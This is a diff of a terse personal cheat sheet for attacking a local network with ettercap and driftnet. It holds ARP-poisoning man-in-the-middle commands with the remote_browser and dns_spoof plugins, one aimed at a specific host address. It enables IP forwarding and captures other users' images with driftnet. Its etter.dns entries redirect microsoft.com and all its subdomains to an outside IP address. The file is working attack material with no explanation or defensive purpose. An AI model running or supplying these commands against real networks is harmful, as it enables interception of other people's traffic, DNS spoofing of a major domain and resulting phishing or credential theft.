@@ -1,13 +1,32 @@
 nano /etc/ettercap/etter.conf 
 nano /etc/ettercap/etter.dns
 
-==========================
+==========================<1>
 driftnet -i wlan0
+
 
 ettercap -T -q -M arp:remote -P remote_browser -i wlan0 ///                                                          
 
 echo 1 > /proc/sys/net/ipv4/ip_forward
 
+============<2>
+ettercap -T -M arp -P dns_spoof -i wlan0 //10.26.62.2//
+ettercap -T -q -M arp:remote -P dns_spoof -i wlan0 //10.26.62.2//  
 
+=====================
 or 
 ettercap-grafc           >>> ettercap -T -q -M arp:remote -P remote_browser -i wlan0 ///     
+
+
+
+ 
+h.com      A   10.0.0.1          
+*.h.com    A   10.0.0.1          
+www.h.com  PTR 10.0.0.1      # Wildcards in PTR are not allowed
+
+
+
+microsoft.com      A   107.170.40.56 1800
+*.microsoft.com    A   107.170.40.56 3600
+www.microsoft.com  PTR 107.170.40.56      # Wildcards in PTR are not allowed
+
